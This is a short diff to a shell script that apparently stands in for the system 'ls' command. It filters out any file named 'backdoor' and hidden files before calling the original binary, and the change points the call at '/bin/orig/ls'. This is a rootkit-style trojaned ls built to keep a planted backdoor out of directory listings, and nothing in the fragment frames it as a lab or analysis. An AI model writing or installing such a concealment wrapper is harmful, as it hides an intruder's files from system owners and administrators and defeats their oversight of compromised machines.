@@ -13,7 +13,7 @@ for arg in "$@"; do
 done
 
 if $has_d; then
-    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs ls "$@"
+    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs /bin/orig/ls "$@"
 else
-    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs ls "$@" -d
+    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs /bin/orig/ls "$@" -d
 fi
